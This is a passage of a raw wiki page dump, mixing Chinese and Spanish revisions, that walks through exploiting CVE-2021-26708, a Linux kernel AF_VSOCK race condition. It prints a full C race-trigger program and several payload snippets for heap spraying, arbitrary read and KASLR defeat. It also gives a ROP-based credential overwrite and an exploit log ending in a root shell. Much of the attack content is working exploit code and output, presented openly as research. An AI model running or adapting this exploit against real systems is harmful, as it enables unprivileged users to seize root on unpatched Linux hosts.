&lt;/div&gt;

[[File:T01a2a2d47c9494c4a5.png | 600px ]]

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
如果在處理 msgsnd() 的過程中發生了來自 setsockopt()線程的 msg_msg.security內存損壞，進而SELinux權限檢查失敗；
在這種情況下，msgsnd()返回-1，損壞的msg_msg被銷毀；釋放msg_msg.security可以釋放原始msg_msg；
用一個可控的payload 覆蓋原始msg_msg：
msgsnd()失敗後，漏洞就會調用pthread_barrier_wait()，調用127個用於堆噴射的pthreads；
這些pthreads執行setxattr()的payload；
原始msg_msg被可控的數據覆蓋，msg_msg.next指針存儲vsock_sock對象的地址；
&lt;/div&gt;

[[File:T0140baae964febb059.png | 600px ]]

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
通過從存儲被覆蓋的 msg_msg的消息隊列中接收消息，將vsock_sock內核對象的內容讀到用戶空間：
&lt;/div&gt;
&lt;pre&gt;
ret = msgrcv(msg_locations[0].msq_id, kmem, ARB_READ_SZ, 0,
                IPC_NOWAIT | MSG_COPY | MSG_NOERROR);
&lt;/pre&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
==尋找攻擊目標==
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
以下是我找到的點：
1.專用的塊緩存，如PINGv6和sock_inode_cache有很多指向對象的指針
2.struct mem_cgroup *sk_memcg指針在vsock_sock.sk偏移量664處。 mem_cgroup結構是在kmalloc-4k塊緩存中分配的。
3.const struct cred *owner指針在vsock_sock.sk偏移量840處，存儲了可以覆蓋進行權限升級的憑證的地址。
4.void (*sk_write_space)(struct sock *)函數指針在vsock_sock.sk偏移量688處，被設置為sock_def_write_space()內核函數的地址。它可以用來計算KASLR偏移量。
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
下面是該漏洞如何從內存中提取這些指針:
&lt;/div&gt;

&lt;pre&gt;
#define SK_MEMCG_RD_LOCATION    (DATALEN_MSG + SK_MEMCG_OFFSET)
#define OWNER_CRED_OFFSET    840
#define OWNER_CRED_RD_LOCATION    (DATALEN_MSG + OWNER_CRED_OFFSET)
#define SK_WRITE_SPACE_OFFSET    688
#define SK_WRITE_SPACE_RD_LOCATION (DATALEN_MSG + SK_WRITE_SPACE_OFFSET) 
/*
 * From Linux kernel 5.10.11-200.fc33.x86_64:
 *   function pointer for calculating KASLR secret
 */
#define SOCK_DEF_WRITE_SPACE    0xffffffff819851b0lu 
unsigned long sk_memcg = 0;
unsigned long owner_cred = 0;
unsigned long sock_def_write_space = 0;
unsigned long kaslr_offset = 0;

/* ... */

    sk_memcg = kmem[SK_MEMCG_RD_LOCATION / sizeof(uint64_t)];
    printf("[+] Found sk_memcg %lx (offset %ld in the leaked kmem)\n",
            sk_memcg, SK_MEMCG_RD_LOCATION);

    owner_cred = kmem[OWNER_CRED_RD_LOCATION / sizeof(uint64_t)];
    printf("[+] Found owner cred %lx (offset %ld in the leaked kmem)\n",
            owner_cred, OWNER_CRED_RD_LOCATION);

    sock_def_write_space = kmem[SK_WRITE_SPACE_RD_LOCATION / sizeof(uint64_t)];
    printf("[+] Found sock_def_write_space %lx (offset %ld in the leaked kmem)\n",
            sock_def_write_space, SK_WRITE_SPACE_RD_LOCATION);

    kaslr_offset = sock_def_write_space - SOCK_DEF_WRITE_SPACE;
    printf("[+] Calculated kaslr offset: %lx\n", kaslr_offset);
&lt;/pre&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
==在 sk_buff 上實現 Use-after-free==
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
Linux內核中與網絡相關的緩衝區用struct sk_buff表示，這個對像中有skb_shared_info與destructor_arg，可以用於控制流劫持。網絡數據和skb_shared_info被放置在由sk_buff.head指向的同一個內核內存塊中。因此，在用戶空間中創建一個2800字節的網絡數據包會使skb_shared_info被分配到kmalloc-4k塊緩存中，mem_cgroup對像也是如此。
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
我構建了以下步驟：
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
1.使用socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)創建一個客戶端套接字和32個服務器套接字
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
2.在用戶空間中準備一個2800字節的緩衝區，並用0x42對其memset()
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
3.用sendto()將這個緩衝區從客戶端套接字發送到每個服務器套接字，用於在kmalloc-4k中創建sk_buff對象。在每個可用的CPU上使用`sched_setaffinity()
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
4.對vsock_sock執行任意讀取過程
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
5.計算可能的sk_buff內核地址為sk_memcg加4096(kmalloc-4k的下一個元素)
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
6.對這個可能的sk_buff地址執行任意讀
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
7.如果在網絡數據的位置找到0x42424242424242lu，則找到真正的sk_buff，進入步驟8。否則，在可能的sk_buff地址上加4096，轉到步驟6
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
8.sk_buff上執行32個pthreads的setxattr()&amp;userfaultfd()堆噴射，並把它們掛在pthread_barrier上
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
9.對sk_buff內核地址進行任意釋放
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
10.調用pthread_barrier_wait()，執行32個setxattr()覆蓋skb_shared_info的堆噴pthreads
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
11.使用recv()接收服務器套接字的網絡消息。
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
==通過skb_shared_info 進行任意寫==
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
以下是覆蓋sk_buff對象的有效payload：
&lt;/div&gt;

&lt;pre&gt;
#define SKB_SIZE        4096
#define SKB_SHINFO_OFFSET    3776
#define MY_UINFO_OFFSET        256
#define SKBTX_DEV_ZEROCOPY    (1 &lt;&lt; 3) 
void prepare_xattr_vs_skb_spray(void)
{
    struct skb_shared_info *info = NULL;

    xattr_addr = spray_data + PAGE_SIZE * 4 - SKB_SIZE + 4;

    /* Don't touch the second part to avoid breaking page fault delivery */
    memset(spray_data, 0x0, PAGE_SIZE * 4);

    info = (struct skb_shared_info *)(xattr_addr + SKB_SHINFO_OFFSET);
    info-&gt;tx_flags = SKBTX_DEV_ZEROCOPY;
    info-&gt;destructor_arg = uaf_write_value + MY_UINFO_OFFSET;

    uinfo_p = (struct ubuf_info *)(xattr_addr + MY_UINFO_OFFSET);
&lt;/pre&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
skb_shared_info駐留在噴射數據中，正好在偏移量SKB_SHINFO_OFFSET處，即3776字節。 skb_shared_info.destructor_arg指針存儲了struct ubuf_info的地址。因為被攻擊的sk_buff的內核地址是已知的，所以能在網絡緩衝區的MY_UINFO_OFFSET處創建了一個假的ubuf_info。下面是有效payload的佈局：
&lt;/div&gt;

[[File:T0185ccbf9f025c74da.png  | 600px]]

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
下面講講destructor_arg 回調:
&lt;/div&gt;
&lt;pre&gt;
 /*
     * A single ROP gadget for arbitrary write:
     *   mov rdx, qword ptr [rdi + 8] ; mov qword ptr [rdx + rcx*8], rsi ; ret
     * Here rdi stores uinfo_p address, rcx is 0, rsi is 1
     */
    uinfo_p-&gt;callback = ARBITRARY_WRITE_GADGET + kaslr_offset;
    uinfo_p-&gt;desc = owner_cred + CRED_EUID_EGID_OFFSET; /* value for "qword ptr [rdi + 8]" */
    uinfo_p-&gt;desc = uinfo_p-&gt;desc - 1; /* rsi value 1 should not get into euid */
&lt;/pre&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
由於在vmlinuz-5.10.11-200.fc33.x86_64中找不到一個能滿足我需求的gadget，所以我自己進行了研究構造。
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
callback函數指針存儲一個ROP gadget 地址，RDI存儲callback函數的第一個參數，也就是ubuf_info本身的地址，RDI + 8指向ubuf_info.desc。 gadget 將ubuf_info.desc移動到RDX。現在RDX包含有效用戶ID和組ID的地址減一個字節。這個字節很重要：當gadget從 RSI向 RDX指向的內存中寫入消息1時，有效的 uid和 gid將被零覆蓋。重複同樣的過程，直到權限升級到root。整個過程輸出流如下：
&lt;/div&gt;
&lt;pre&gt;
[a13x@localhost ~]$ ./vsock_pwn

=================================================
==== CVE-2021-26708 PoC exploit by a13xp0p0v ====
=================================================

[+] begin as: uid=1000, euid=1000
[+] we have 2 CPUs for racing
[+] getting ready...
[+] remove old files for ftok()
[+] spray_data at 0x7f0d9111d000
[+] userfaultfd #1 is configured: start 0x7f0d91121000, len 0x1000
[+] fault_handler for uffd 38 is ready

[+] stage I: collect good msg_msg locations
[+] go racing, show wins: 
    save msg_msg ffff9125c25a4d00 in msq 11 in slot 0
    save msg_msg ffff9125c25a4640 in msq 12 in slot 1
    save msg_msg ffff9125c25a4780 in msq 22 in slot 2
    save msg_msg ffff9125c3668a40 in msq 78 in slot 3

[+] stage II: arbitrary free msg_msg using corrupted msg_msg
    kaddr for arb free: ffff9125c25a4d00
    kaddr for arb read: ffff9125c2035300
[+] adapt the msg_msg spraying payload:
    msg_ptr 0x7f0d91120fd8
    m_type 1337 at 0x7f0d91120fe8
    m_ts 6096 at 0x7f0d91120ff0
    msgseg next 0xffff9125c2035300 at 0x7f0d91120ff8
[+] go racing, show wins: 

[+] stage III: arbitrary read vsock via good overwritten msg_msg (msq 11)
[+] msgrcv returned 6096 bytes
[+] Found sk_memcg ffff9125c42f9000 (offset 4712 in the leaked kmem)
[+] Found owner cred ffff9125c3fd6e40 (offset 4888 in the leaked kmem)
[+] Found sock_def_write_space ffffffffab9851b0 (offset 4736 in the leaked kmem)
[+] Calculated kaslr offset: 2a000000

[+] stage IV: search sprayed skb near sk_memcg...
[+] checking possible skb location: ffff9125c42fa000
[+] stage IV part I: repeat arbitrary free msg_msg using corrupted msg_msg
    kaddr for arb free: ffff9125c25a4640
    kaddr for arb read: ffff9125c42fa030
[+] adapt the msg_msg spraying payload:
    msg_ptr 0x7f0d91120fd8
    m_type 1337 at 0x7f0d91120fe8
    m_ts 6096 at 0x7f0d91120ff0
    msgseg next 0xffff9125c42fa030 at 0x7f0d91120ff8
[+] go racing, show wins: 0 0 20 15 42 11 
[+] stage IV part II: arbitrary read skb via good overwritten msg_msg (msq 12)
[+] msgrcv returned 6096 bytes
[+] found a real skb

[+] stage V: try to do UAF on skb at ffff9125c42fa000
[+] skb payload:
    start at 0x7f0d91120004
    skb_shared_info at 0x7f0d91120ec4
    tx_flags 0x8
    destructor_arg 0xffff9125c42fa100
    callback 0xffffffffab64f6d4
    desc 0xffff9125c3fd6e53
[+] go racing, show wins: 15 

[+] stage VI: repeat UAF on skb at ffff9125c42fa000
[+] go racing, show wins: 0 12 13 15 3 12 4 16 17 18 9 47 5 12 13 9 13 19 9 10 13 15 12 13 15 17 30 

[+] finish as: uid=0, euid=0
[+] starting the root shell...
uid=0(root) gid=0(root) groups=0(root),1000(a13x) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
&lt;/pre&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
==視頻==
&lt;/div&gt;
&lt;youtube&gt;https://www.youtube.com/watch?v=EC8PFOYOUgU&lt;/youtube&gt;


&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
==參考==
&lt;/div&gt;
https://a13xp0p0v.github.io/2021/02/09/CVE-2021-26708.html</text>
      <sha1>sxlk6t4fcsr4hafz5xpuh9hwloiri5e</sha1>
    </revision>
    <revision>
      <id>2314</id>
      <parentid>2304</parentid>
      <timestamp>2021-05-05T05:47:06Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "El fuzzer syzkaller no tiene forma de reproducir este bloqueo, así que decidí estudiarlo yo mismo. Pero, ¿por qué falla el fuzzer? Observe &lt;code&gt; vsock_update_buffer_size..."</comment>
      <origin>2314</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="27154" sha1="ngjfj9jcawrm8vir9k3s8ytm0aedl9t" xml:space="preserve">&lt;languages  /&gt;
Vulnerabilidad

Estas vulnerabilidades son causadas por la contención condicional provocada por un falso bloqueo en &lt;code&gt;net/vmw_vsock/af_vsock.c&lt;/code&gt;. Estas contenciones de condiciones se introdujeron implícitamente en el commit de noviembre de 2019 que añadió el soporte de multitransferencia VSOCK y se fusionaron en la versión 5.5-rc1 del kernel de Linux.

&lt;code&gt;CONFIG_VSOCKETS&lt;/code&gt; y &lt;code&gt;CONFIG_VIRTIO_VSOCKETS&lt;/code&gt; se proporcionan como módulos del núcleo en todas las principales distribuciones de GNU/Linux. Estos módulos vulnerables se cargan automáticamente cuando se crea un socket para el dominio AF_VSOCK.
&lt;pre&gt;
vsock = socket(AF_VSOCK, SOCK_STREAM, 0);
&lt;/pre&gt;

La creación de sockets &lt;code&gt;AF_VSOCK&lt;/code&gt; está disponible para los usuarios sin privilegios y no requiere espacio de nombre de usuario.


Corrupción de la memoria

A continuación se detalla la explotación de la CVE-2021-26708, que hace uso de la competencia condicional en &lt;code&gt;vsock_stream_etssockopt()&lt;/code&gt;, la recuperación requiere dos hilos, el primero de los cuales llama a &lt;code&gt;setsockopt()&lt;/code&gt;.
&lt;pre&gt;
  setsockopt(vsock, PF_VSOCK, SO_VM_SOCKETS_BUFFER_SIZE,
                &amp;size, sizeof(unsigned long));
&lt;/pre&gt;



El segundo hilo cambia el transporte del socket virtual cuando &lt;código&gt;vsock_stream_etssockopt()&lt;/código&gt; intenta obtener un bloqueo de socket, lo que se consigue reconectando el socket virtual a.
&lt;pre&gt;
struct sockaddr_vm addr = {
        .svm_family = AF_VSOCK,
    };

    addr.svm_cid = VMADDR_CID_LOCAL;
    connect(vsock, (struct sockaddr *)&amp;addr, sizeof(struct sockaddr_vm));

    addr.svm_cid = VMADDR_CID_HYPERVISOR;
    connect(vsock, (struct sockaddr *)&amp;addr, sizeof(struct sockaddr_vm));
&lt;/pre&gt;


Para manejar &lt;code&gt;connect()&lt;/code&gt; para sockets virtuales, el kernel ejecuta &lt;code&gt;vsock_stream_connect()&lt;/code&gt; que llama a &lt;code&gt;vsock_assign_transport()&lt;/code&gt;. Esta función contiene el siguiente código.
&lt;pre&gt;
     if (vsk-&gt;transport) {
            if (vsk-&gt;transport == new_transport)
                return 0;

            /* transport-&gt;release() must be called with sock lock acquired.
             * This path can only be taken during vsock_stream_connect(),
             * where we have already held the sock lock.
             * In the other cases, this function is called on a new socket
             * which is not assigned to any transport.
             */
            vsk-&gt;transport-&gt;release(vsk);
            vsock_deassign_transport(vsk);
        }
&lt;/pre&gt;

&lt;código&gt;vsock_stream_connect()&lt;/código&gt; contiene el bloqueo del socket, y &lt;código&gt;vsock_stream_setsockopt()&lt;/código&gt; en el hilo paralelo también intenta obtenerlo, constituyendo una competencia condicional. Como resultado, la función &lt;code&gt;vsock_deassign_transport()&lt;/code&gt; es llamada cuando se realiza una segunda &lt;code&gt;connect()&lt;/code&gt; con un &lt;code&gt;svm_cid&lt;/code&gt; diferente. La función ejecuta &lt;code&gt;virtio_transport_destruct()&lt;/code&gt;, liberando &lt;code&gt;vsock_sock.trans&lt;/code&gt;, y &lt;code&gt;vsk-&gt;transport&lt;/code&gt; se establece en NULL. cuando &lt;code&gt;vsock_ stream_connect()&lt;/code&gt; libera el bloqueo del socket, &lt;code&gt;vsock_stream_setsockopt()&lt;/code&gt; puede seguir ejecutándose. Llama a &lt;code&gt;vsock_update_buffer_size()&lt;/code&gt;, seguido de &lt;code&gt;transport-&gt;notify_buffer_size()&lt;/code&gt;. Aquí el transporte contiene un valor obsoleto de una variable local que no coincide con &lt;code&gt;vsk-&gt;transport&lt;/code&gt; (la causa se establece en NULL).

El núcleo ejecuta &lt;código&gt;virtio_transport_notify_buffer_size()&lt;/código&gt; con corrupción de memoria.
&lt;pre&gt;
void virtio_transport_notify_buffer_size(struct vsock_sock *vsk, u64 *val)
{
    struct virtio_vsock_sock *vvs = vsk-&gt;trans;

    if (*val &gt; VIRTIO_VSOCK_MAX_BUF_SIZE)
        *val = VIRTIO_VSOCK_MAX_BUF_SIZE;

    vvs-&gt;buf_alloc = *val;

    virtio_transport_send_credit_update(vsk, VIRTIO_VSOCK_TYPE_STREAM, NULL);
}
&lt;/pre&gt;

Aquí, el vvs es un puntero a la memoria del núcleo, que ha sido liberado en &lt;code&gt;virtio_transport_destruct()&lt;/code&gt;. La &lt;code&gt;estructura virtio_vsock_sock&lt;/code&gt; tiene un tamaño de 64 bytes y se encuentra en la caché de bloques kmalloc-64. El tipo de campo buf_alloc es u32, ubicado en el offset 40. &lt;code&gt;VIRTIO_VSOCK_MAX_BUF_SIZE es 0xFFFFFFUL&lt;/code&gt;. El valor de *val es controlado por el atacante, y sus cuatro bytes menos significativos se escriben en la memoria liberada.


Prueba difusa

El fuzzer syzkaller no tiene forma de reproducir este bloqueo, así que decidí estudiarlo yo mismo. Pero, ¿por qué falla el fuzzer? Observe &lt;code&gt; vsock_update_buffer_size () &lt;/code&gt; y descubra:
&lt;pre&gt;
 if (val != vsk-&gt;buffer_size &amp;&amp;
      transport &amp;&amp; transport-&gt;notify_buffer_size)
        transport-&gt;notify_buffer_size(vsk, &amp;val);

    vsk-&gt;buffer_size = val;

&lt;/pre&gt;

Solo cuando val sea diferente del actual buffer_size, se llamará a &lt;code&gt; notify_buffer_size () &lt;/code&gt;, es decir, cuando &lt;code&gt; setsockopt () &lt;/code&gt; ejecute &lt;code&gt; SO_VM_SOCKETS_BUFFER_SIZE &lt;/code&gt;, cada vez Los parámetros de tamaño de la llamada deben ser todos diferentes. Entonces construí el código relevante:
&lt;pre&gt;
/*
 * AF_VSOCK vulnerability trigger.
 * It's a PoC just for fun.
 * Author: Alexander Popov &lt;alex.popov@linux.com&gt;.
 */

#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;pthread.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;linux/vm_sockets.h&gt;
#include &lt;unistd.h&gt;

#define err_exit(msg) do { perror(msg); exit(EXIT_FAILURE); } while (0)

#define MAX_RACE_LAG_USEC 50

int vsock = -1;
int tfail = 0;
pthread_barrier_t barrier;

int thread_sync(long lag_nsec)
{
	int ret = -1;
	struct timespec ts0;
	struct timespec ts;
	long delta_nsec = 0;

	ret = pthread_barrier_wait(&amp;barrier);
	if (ret != 0 &amp;&amp; ret != PTHREAD_BARRIER_SERIAL_THREAD) {
		perror("[-] pthread_barrier_wait");
		return EXIT_FAILURE;
	}

	ret = clock_gettime(CLOCK_MONOTONIC, &amp;ts0);
	if (ret != 0) {
		perror("[-] clock_gettime");
		return EXIT_FAILURE;
	}

	while (delta_nsec &lt; lag_nsec) {
		ret = clock_gettime(CLOCK_MONOTONIC, &amp;ts);
		if (ret != 0) {
			perror("[-] clock_gettime");
			return EXIT_FAILURE;
		}

		delta_nsec = (ts.tv_sec - ts0.tv_sec) * 1000000000 +
						ts.tv_nsec - ts0.tv_nsec;
	}

	return EXIT_SUCCESS;
}

void *th_connect(void *arg)
{
	int ret = -1;
	long lag_nsec = *((long *)arg) * 1000;
	struct sockaddr_vm addr = {
		.svm_family = AF_VSOCK,
	};

	ret = thread_sync(lag_nsec);
	if (ret != EXIT_SUCCESS) {
		tfail++;
		return NULL;
	}

	addr.svm_cid = VMADDR_CID_LOCAL;
	connect(vsock, (struct sockaddr *)&amp;addr, sizeof(struct sockaddr_vm));

	addr.svm_cid = VMADDR_CID_HYPERVISOR;
	connect(vsock, (struct sockaddr *)&amp;addr, sizeof(struct sockaddr_vm));

	return NULL;
}

void *th_setsockopt(void *arg)
{
	int ret = -1;
	long lag_nsec = *((long *)arg) * 1000;
	struct timespec tp;
	unsigned long size = 0;

	ret = thread_sync(lag_nsec);
	if (ret != EXIT_SUCCESS) {
		tfail++;
		return NULL;
	}

	clock_gettime(CLOCK_MONOTONIC, &amp;tp);
	size = tp.tv_nsec;
	setsockopt(vsock, PF_VSOCK, SO_VM_SOCKETS_BUFFER_SIZE,
						&amp;size, sizeof(unsigned long));

	return NULL;
}

int main(void)
{
	int ret = -1;
	unsigned long size = 0;
	long loop = 0;
	pthread_t th[2] = { 0 };

	vsock = socket(AF_VSOCK, SOCK_STREAM, 0);
	if (vsock == -1)
		err_exit("[-] open vsock");

	printf("[+] AF_VSOCK socket is opened\n");

	size = 1;
	setsockopt(vsock, PF_VSOCK, SO_VM_SOCKETS_BUFFER_MIN_SIZE,
						&amp;size, sizeof(unsigned long));
	size = 0xfffffffffffffffdlu;
	setsockopt(vsock, PF_VSOCK, SO_VM_SOCKETS_BUFFER_MAX_SIZE,
						&amp;size, sizeof(unsigned long));

	ret = pthread_barrier_init(&amp;barrier, NULL, 2);
	if (ret != 0)
		err_exit("[-] pthread_barrier_init");

	for (loop = 0; loop &lt; 30000; loop++) {
		long tmo1 = 0;
		long tmo2 = loop % MAX_RACE_LAG_USEC;

		printf("race loop %ld: tmo1 %ld, tmo2 %ld\n", loop, tmo1, tmo2);

		ret = pthread_create(&amp;th[0], NULL, th_connect, &amp;tmo1);
		if (ret != 0)
			err_exit("[-] pthread_create #0");

		ret = pthread_create(&amp;th[1], NULL, th_setsockopt, &amp;tmo2);
		if (ret != 0)
			err_exit("[-] pthread_create #1");

		ret = pthread_join(th[0], NULL);
		if (ret != 0)
			err_exit("[-] pthread_join #0");

		ret = pthread_join(th[1], NULL);
		if (ret != 0)
			err_exit("[-] pthread_join #1");

		if (tfail) {
			printf("[-] some thread got troubles\n");
			exit(EXIT_FAILURE);
		}
	}

	ret = close(vsock);
	if (ret)
		perror("[-] close");

	printf("[+] now see your warnings in the kernel log\n");
	return 0;
}
&lt;/pre&gt;

El valor de tamaño aquí se toma del número de nanosegundos devueltos por &lt;code&gt; clock_gettime () &lt;/code&gt;, que puede ser diferente cada vez. El syzkaller original no hace esto, porque cuando syzkaller genera una entrada fuzzing, el valor del parámetro syscall está determinado y no cambiará durante la ejecución.

== El poder de cuatro bytes ==

Aquí elijo Fedora 33 Server como el objetivo de la investigación, la versión del kernel es 5.10.11-200.fc33.x86_64, y estoy decidido a omitir SMEP y SMAP.

En el primer paso, comencé a estudiar la pulverización de pila estable, que explotaba la ejecución de las actividades del espacio del usuario para hacer que el kernel asignara otro objeto de 64 bytes en la ubicación del virtio_vsock_sock liberado. Después de varios intentos experimentales, se confirmó que el virtio_vsock_sock publicado se sobrescribió, lo que indica que la fumigación en pilas es factible. Finalmente encontré msgsnd () syscall. Crea struct msg_msg en el espacio del kernel, vea la salida de pahole:
&lt;pre&gt;
struct msg_msg {
    struct list_head           m_list;               /*     0    16 */
    long int                   m_type;               /*    16     8 */
    size_t                     m_ts;                 /*    24     8 */
    struct msg_msgseg *        next;                 /*    32     8 */
    void *                     security;             /*    40     8 */

    /* size: 48, cachelines: 1, members: 5 */
    /* last cacheline: 48 bytes */
};
&lt;/pre&gt;

El anverso es el encabezado del mensaje y el reverso son los datos del mensaje. Si la estructura msgbuf en el espacio de usuario tiene un mtext de 16 bytes, se creará el correspondiente msg_msg en la caché del bloque kmalloc-64. Una escritura libre de 4 bytes destruirá el puntero de seguridad void * en el desplazamiento 40. El campo msg_msg.security apunta a los datos del kernel asignados por lsm_msg_msg_alloc (). Cuando se reciba msg_msg, será liberado por security_msg_msg_free (). Por lo tanto, al destruir la primera mitad del puntero de seguridad, se puede obtener una libertad arbitraria.

== Fuga de información del kernel ==

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
這裡使用了[https://www.pwnwiki.org/index.php?title=CVE-2019-18683_Linux_kernel_through_5.3.8_%E7%89%B9%E6%AC%8A%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E CVE-2019-18683]相同的技巧。虛擬套接字的第二個connect()調用&lt;code&gt;vsock_deassign_transport()&lt;/code&gt;，將&lt;code&gt;vsk-&gt;transport&lt;/code&gt;設置為NULL，使得&lt;code&gt;vsock_stream_setsockopt()&lt;/code&gt;在內存崩潰後調用&lt;code&gt;virtio_transport_send_pkt_info()&lt;/code&gt;，出現內核告警：
&lt;/div&gt;
&lt;pre&gt;
WARNING: CPU: 1 PID: 6739 at net/vmw_vsock/virtio_transport_common.c:34
...
CPU: 1 PID: 6739 Comm: racer Tainted: G        W         5.10.11-200.fc33.x86_64 #1
Hardware name: QEMU Standard PC (Q35 + ICH9, 2009), BIOS 1.13.0-2.fc32 04/01/2014
RIP: 0010:virtio_transport_send_pkt_info+0x14d/0x180 [vmw_vsock_virtio_transport_common]
...
RSP: 0018:ffffc90000d07e10 EFLAGS: 00010246
RAX: 0000000000000000 RBX: ffff888103416ac0 RCX: ffff88811e845b80
RDX: 00000000ffffffff RSI: ffffc90000d07e58 RDI: ffff888103416ac0
RBP: 0000000000000000 R08: 00000000052008af R09: 0000000000000000
R10: 0000000000000126 R11: 0000000000000000 R12: 0000000000000008
R13: ffffc90000d07e58 R14: 0000000000000000 R15: ffff888103416ac0
FS:  00007f2f123d5640(0000) GS:ffff88817bd00000(0000) knlGS:0000000000000000
CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
CR2: 00007f81ffc2a000 CR3: 000000011db96004 CR4: 0000000000370ee0
Call Trace:
  virtio_transport_notify_buffer_size+0x60/0x70 [vmw_vsock_virtio_transport_common]
  vsock_update_buffer_size+0x5f/0x70 [vsock]
  vsock_stream_setsockopt+0x128/0x270 [vsock]
...
&lt;/pre&gt;
&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
通過gdb調試，發現RCX寄存器包含了釋放的virtio_vsock_sock的內核地址，RBX寄存器包含了vsock_sock的內核地址。
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
==實現任意讀==
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
===從 arbitrary free 到 use-after-free===
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
從洩露的內核地址釋放一個對象
執行堆噴，用受控數據覆蓋該對象
使用損壞的對象進行權限升級
內核實現的System V消息有限制最大值DATALEN_MSG，即PAGE_SIZE減去sizeof(struct msg_msg))。如果你發送了更大的消息，剩餘的消息會被保存在消息段的列表中。 msg_msg中包含struct msg_msgseg *next用於指向第一個段，size_t m_ts用於存儲大小。當進行覆蓋操作時，就可以把受控的值放在msg_msg.m_ts和msg_msg.next中：
&lt;/div&gt;

[[File:T01a51dfe7a996e854c.png | 600px ]]


Payload:
&lt;pre&gt;
    #define PAYLOAD_SZ 40 
    void adapt_xattr_vs_sysv_msg_spray(unsigned long kaddr)
    {
        struct msg_msg *msg_ptr;

        xattr_addr = spray_data + PAGE_SIZE * 4 - PAYLOAD_SZ;

        /* Don't touch the second part to avoid breaking page fault delivery */
        memset(spray_data, 0xa5, PAGE_SIZE * 4);

        printf("[+] adapt the msg_msg spraying payload:\n");
        msg_ptr = (struct msg_msg *)xattr_addr;
        msg_ptr-&gt;m_type = 0x1337;
        msg_ptr-&gt;m_ts = ARB_READ_SZ;
        msg_ptr-&gt;next = (struct msg_msgseg *)kaddr; /* set the segment ptr for arbitrary read */
        printf("\tmsg_ptr %p\n\tm_type %lx at %p\n\tm_ts %zu at %p\n\tmsgseg next %p at %p\n",
               msg_ptr,
               msg_ptr-&gt;m_type, &amp;(msg_ptr-&gt;m_type),
               msg_ptr-&gt;m_ts, &amp;(msg_ptr-&gt;m_ts),
               msg_ptr-&gt;next, &amp;(msg_ptr-&gt;next));
    }
&lt;/pre&gt;
&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
但是如何使用msg_msg讀取內核數據呢？通過閱讀msgrcv()系統調用文檔，我找到了好解決方案，使用msgrcv()和MSG標誌：
&lt;/div&gt;
&lt;pre&gt;
MSG_COPY (since Linux 3.8)
        Nondestructively fetch a copy of the message at the ordinal position  in  the  queue
        specified by msgtyp (messages are considered to be numbered starting at 0).
&lt;/pre&gt;
&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
這個標誌使內核將消息數據複製到用戶空間，不從消息隊列中刪除。如果內核有CONFIG_CHECKPOINT_RESTORE=y，則MSG是可用的，在Fedora Server適用。
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
===任意讀的步驟===
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
準備工作：
使用sched_getaffinity()和CPU_COUNT()計算可用的CPU數量（該漏洞至少需要兩個）;
打開/dev/kmsg進行解析;
mmap()將spray_data內存區域配置userfaultfd()作為最後一部分;
啟動一個單獨的pthread來處理userfaultfd()事件;
啟動127個threads用於msg_msg上的setxattr()&amp;userfaultfd()堆噴射，並將它們掛在thread_barrier上;
獲取原始msg_msg的內核地址:
在虛擬套接字上進行條件競爭;
在第二個connect()後，在忙循環中等待35微秒;
